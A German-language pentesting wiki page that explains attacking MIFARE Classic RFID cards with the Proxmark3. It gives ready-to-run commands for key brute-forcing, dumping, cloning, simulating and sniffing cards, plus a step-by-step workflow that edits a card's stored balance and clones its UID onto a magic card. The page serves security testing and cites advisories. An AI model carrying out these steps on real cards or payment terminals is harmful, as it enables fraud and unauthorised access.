# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## RFID-Systeme mit Proxmark3 angreifen

Installiere den aktiv gepflegten RRG/Iceman-Proxmark3-Client und die dazu passende Firmware. Überprüfe anschließend die Befehlssyntax für diesen Build, da sich ältere Befehle wie die unten gezeigten geändert haben können.<sup>[[1]](#references)[[5]](#references)</sup>

### MIFARE Classic 1KB angreifen

MIFARE Classic 1K hat **16 Sektoren** mit jeweils **4 Blöcken** à **16 Bytes**. Block 0 des Herstellers enthält die UID-/Herstellerdaten und ist auf echten NXP-Karten schreibgeschützt. Spezielle Klon- oder „Magic“-Karten erlauben möglicherweise, ihn neu zu beschreiben.<sup>[[1]](#references)[[2]](#references)</sup>\
Um auf jeden Sektor zuzugreifen, benötigst du **2 Schlüssel** (**A** und **B**), die in **Block 3 jedes Sektors** (Sektor-Trailer) gespeichert sind. Der Sektor-Trailer speichert außerdem die **Zugriffsbits**, die mithilfe der beiden Schlüssel die **Lese- und Schreibberechtigungen** für **jeden Block** festlegen.\
Zwei Schlüssel sind beispielsweise nützlich, um Leseberechtigungen zu vergeben, wenn du den ersten Schlüssel kennst, und Schreibberechtigungen, wenn du den zweiten kennst.

Es können mehrere Angriffe durchgeführt werden.

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

The Proxmark3 ermöglicht weitere Aktionen, etwa das **Eavesdropping** einer **Tag-to-Reader-Kommunikation**, um nach sensiblen Daten zu suchen. Bei dieser Karte könntest du die Kommunikation einfach sniffen und den verwendeten Schlüssel berechnen, da die **verwendeten kryptografischen Operationen schwach sind** und sich der Schlüssel mit bekanntem Klar- und Chiffretext berechnen lässt (Tool `mfkey64`).<sup>[[3]](#references)</sup>

#### Schneller MiFare-Classic-Workflow für den Missbrauch gespeicherter Werte

Wenn Terminals Guthaben auf Classic-Karten speichern, sieht ein typischer End-to-End-Ablauf so aus:<sup>[[4]](#references)</sup>

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

Hinweise

- `hf mf autopwn` koordiniert Angriffe im Stil von nested/darkside/HardNested, stellt Schlüssel wieder her und erstellt Dumps im Dumps-Ordner des Clients.<sup>[[1]](#references)</sup>
- Das Schreiben auf Block 0/UID funktioniert nur bei Magic-Karten der Generation 1a/2. Bei normalen Classic-Karten ist die UID schreibgeschützt.<sup>[[2]](#references)</sup>
- Viele Installationen verwenden Classic-„Value Blocks“ oder einfache Prüfsummen. Achte darauf, dass alle duplizierten/komplementierten Felder und Prüfsummen nach der Bearbeitung konsistent sind.<sup>[[4]](#references)</sup>

Eine übergeordnete Methodik und Gegenmaßnahmen findest du hier:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw-Befehle

IoT-Systeme verwenden manchmal **nicht markengebundene oder nicht kommerzielle Tags**. In diesem Fall kannst du Proxmark3 verwenden, um benutzerdefinierte **Raw-Befehle an die Tags** zu senden.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

Mit diesen Informationen kannst du versuchen, nach Informationen über die Karte und die Art der Kommunikation mit ihr zu suchen. Proxmark3 ermöglicht das Senden von Raw-Befehlen wie: `hf 14a raw -p -b 7 26`

### Scripts

Die Proxmark3-Software enthält eine vorinstallierte Liste von **Automatisierungsscripts**, mit denen du einfache Aufgaben ausführen kannst. Verwende den Befehl `script list`, um die vollständige Liste abzurufen. Verwende anschließend den Befehl `script run`, gefolgt vom Namen des Scripts:

```
proxmark3> script run mfkeys
```

Du kannst ein Skript erstellen, um **Tag-Reader zu fuzzing**: Kopiere die Daten einer **gültigen Karte** und schreibe einfach ein **Lua-Skript**, das ein oder mehrere zufällige **Bytes** randomisiert und bei jeder Iteration prüft, ob der **Reader abstürzt**.

## References

- [1] [Proxmark3-Wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3-Wiki: HF-Magic-Karten](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP-Stellungnahme zu MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Ausnutzung einer NFC-Kartenschwachstelle in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux-Installation](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
